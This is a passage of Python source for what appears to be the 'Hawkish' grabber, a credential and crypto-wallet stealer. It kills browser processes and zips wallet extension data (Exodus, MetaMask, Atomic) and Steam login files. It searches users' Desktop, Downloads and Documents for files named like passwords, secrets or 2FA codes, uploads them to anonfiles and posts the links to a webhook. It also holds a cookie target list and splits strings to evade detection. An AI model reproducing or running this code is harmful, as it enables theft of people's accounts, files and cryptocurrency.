        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
    }

    if name == "checkthismadafaka":
        data = {
            "content": "",

            "embeds": [
                {
                    "fields": [
                        {"name": "Interesting files found on user PC:", "value": tk}
                    ],
                    "author": {
                        "name": f"{hwkish}-{grbber} v7",
                        "url": f"https://github.com/{hwkish}-{stspecial}",
                        "icon_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/ghost-eye.gif",
                    },
                    "footer": {"text": f"github.com/{hwkish}-{stspecial}"},
                    "color": 16734976,
                }
            ],
            "avatar_url": f"https://raw.githubusercontent.com/{hwkish}x/assets/main/hawkish.png",
            "username": f"{hwkish} - {grbber}",
            "attachments": [],
        }
        URL_librairy_Loading(hook, json.dumps(data).encode(), headers=headers)
        return


def checkIfProcessRunning(processName):
    for proc in psutil.process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False


def ZipMyThings(path, arg, procc):
    pathC = path
    name = arg
    browser = ""
    if "aholpfdialjgjfhomihkjbmgjidlcdno" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}-EXODUS"
        pathC = os.path.join(path, arg)
    elif inp in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}-METAMASK"
        pathC = os.path.join(path, arg)
    if not os.path.exists(pathC):
        return
    if checkIfProcessRunning("chrome.exe"):
        Popen(f"taskkill /im {procc} /t /f", shell=True)
    else:
        ...
    if "Wal"+"let" in arg or "NationsGlory" in arg:
        browser = path.split("\\")[4].split("/")[1].replace(" ", "")
        name = f"{browser}"
    elif "Steam" in arg:
        loginusers_path = os.path.join(pathC, "loginusers.vdf")
        if not os.path.isfile(loginusers_path):
            return
        with open(loginusers_path, "r+", encoding="utf8") as f:
            data = f.readlines()
        found = any('RememberPassword"\t\t"1"' in l for l in data)
        if not found:
            return
        name = arg
    zip_path = os.path.join(pathC, f"{name}.zip")
    with zipfile.ZipFile(zip_path, "w") as zf:
        for file in os.listdir(pathC):
            if not file.endswith(".zip"):
                zf.write(os.path.join(pathC, file))
    upload(zip_path)
    os.remove(zip_path)


def The_Pathbrows():
    "Default Path < 0 >                         ProcesName < 1 >        Token  < 2 >              Password < 3 >     C00ks < 4 >                          Extentions < 5 >"
    browserPaths = [
        [
            f"{roaming}/Opera Software/Opera GX Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            f"/{ntwrk}",
            f"/Local Extension Settings/{inp}",
        ],
        [
            f"{roaming}/Opera Software/Opera Stable",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            f"/{ntwrk}",
            f"/Local Extension Settings/{inp}",
        ],
        [
            f"{roaming}/Opera Software/Opera Neon/User Data/Default",
            "opera.exe",
            "/Local Storage/leveldb",
            "/",
            f"/{ntwrk}",
            f"/Local Extension Settings/{inp}",
        ],
        [
            f"{local}/Google/Chrome/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            f"/Default/{ntwrk}",
            f"/Default/Local Extension Settings/{inp}",
        ],
        [
            f"{local}/Google/Chrome SxS/User Data",
            "chrome.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            f"/Default/{ntwrk}",
            f"/Default/Local Extension Settings/{inp}",
        ],
        [
            f"{local}/BraveSoftware/Brave-Browser/User Data",
            "brave.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            f"/Default/{ntwrk}",
            f"/Default/Local Extension Settings/{inp}",
        ],
        [
            f"{local}/Yandex/YandexBrowser/User Data",
            "yandex.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            f"/Default/{ntwrk}",
            f"/HougaBouga/{inp}",
        ],
        [
            f"{local}/Microsoft/Edge/User Data",
            "edge.exe",
            "/Default/Local Storage/leveldb",
            "/Default",
            f"/Default/{ntwrk}",
            f"/Default/Local Extension Settings/{inp}",
        ],
    ]

    Paths_zipped = [
        [f"{roaming}/atomic/Local Storage/leveldb",
            '"Atomic Wal'+'let.exe"', "Wal"+"let"],
        [f"{roaming}/Exodus/exodus.wall"+"et", "Exodus.exe", "Wa"+"llet"],
        ["C:\Program Files (x86)\Steam\config", "steam.exe", "Steam"],
        [
            f"{roaming}/NationsGlory/Local Storage/leveldb",
            "NationsGlory.exe",
            "NationsGlory",
        ],
    ]

    for patt in browserPaths:
        threading.Thread(target=ZipMyThings, args=[
                         patt[0], patt[5], patt[1]]).start()
    for patt in Paths_zipped:
        threading.Thread(target=ZipMyThings, args=[
                         patt[0], patt[2], patt[1]]).start()
    for thread in Threadlist:
        thread.join()



def upload_on_anonfiles(path):
    try:
        with open(path, mode="rb") as file:
            files = {"file": file}
            upload = requests.post("https://api.anonfiles.com/upload", files=files)
            response = upload.json()
            if response["status"]:
                return response["data"]["file"]["url"]["full"]
        return False
    except:
        return False

def CreateFolder_(pathF, keywords):
    global create_found
    maxfilesperdir = 7
    i = 0
    listOfFile = os.listdir(pathF)
    ffound = []
    for file in listOfFile:
        if not os.path.isfile(pathF + "/" + file):
            return
        i += 1
        if i <= maxfilesperdir:
            url = upload_on_anonfiles(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    create_found.append(["folder", pathF + "/", ffound])


create_found = []


def create_file(path, keywords):
    global create_found
    fifound = []
    listOfFile = os.listdir(path)
    for file in listOfFile:
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append(
                        [path + "/" + file, upload_on_anonfiles(path + "/" + file)]
                    )
                    break
                if os.path.isdir(path + "/" + file):
                    target = path + "/" + file
                    CreateFolder_(target, keywords)
                    break
    create_found.append(["folder", path, fifound])


def checkthismadafaka():
    user = temp.split("\AppData")[0]
    path2search = [user + "/Desktop", user + "/Downloads", user + "/Documents"]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_"+"passe",
        "login",
        "secret",
        "acc"+"ount",
        "acount",
        "paypal",
        "banque",
        "met"+"amask",
        "wal"+"let",
        "crypto",
        "exodus",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret",
    ]

    wikith = []
    for patt in path2search:
        checkthismadafaka = threading.Thread(
            target=create_file, args=[patt, key_wordsFiles]
        )
        checkthismadafaka.start()
        wikith.append(checkthismadafaka)
    return wikith


global wordstocheckk, thec00ks, words_passw

wordstocheckk = [
    "mail",
    "[gmail](https://gmail.com)",
    "[sellix](https://sellix.io)",
    "[steam](https://steam.com)",
    "[discord](https://discord.com)",
    "[riotgames](https://riotgames.com)",
    "[youtube](https://youtube.com)",
    "[instagram](https://instagram.com)",
    "[tiktok](https://tiktok.com)",
    "[twitter](https://twitter.com)",
    "[facebook](https://facebook.com)",
    "card",
    "[epicgames](https://epicgames.com)",
    "[spotify](https://spotify.com)",
    "[yahoo](https://yahoo.com)",
    "[roblox](https://roblox.com)",
    "[twitch](https://twitch.com)",
    "[minecraft](https://minecraft.net)",
    "bank",
    "[paypal](https://paypal.com)",
    "[origin](https://origin.com)",
    "[amazon](https://amazon.com)",
    "[ebay](https://ebay.com)",
    "[aliexpress](https://aliexpress.com)",
    "[playstation](https://playstation.com)",
    "[hbo](https://hbo.com)",
    "[xbox](https://xbox.com)",
    "buy",
    "sell",
    "[binance](https://binance.com)",
    "[hotmail](https://hotmail.com)",
    "[outlook](https://outlook.com)",
    "[crunchyroll](https://crunchyroll.com)",
    "[telegram](https://telegram.com)",
    "[pornhub](https://pornhub.com)",
    "[disney](https://disney.com)",
    "[expressvpn](https://expressvpn.com)",
    "crypto",
    "[uber](https://uber.com)",
    "[netflix](https://netflix.com)",
]



The_Pathbrows()
wikith = checkthismadafaka()

for thread in wikith:
    thread.join()
time.sleep(0.2)

text_file = "```diff\n"
for arg in create_found:
    if len(arg[2]) != 0:
        doss_path = arg[1]
        doss_list = arg[2]
        text_file += f"\n"
        text_file += f"- {doss_path}\n"

        for fiifil in doss_list:
            a = fiifil[0].split("/")
            fileanme = a[len(a) - 1]
            b = fiifil[1]
            text_file += f"+ Name: {fileanme}\n+ Link: {b}"
            text_file += "\n"
text_file += "\n```"

upload("checkthismadafaka", text_file)
autoo = threading.Thread(target=Replacer_Loop().run)
autoo.start()
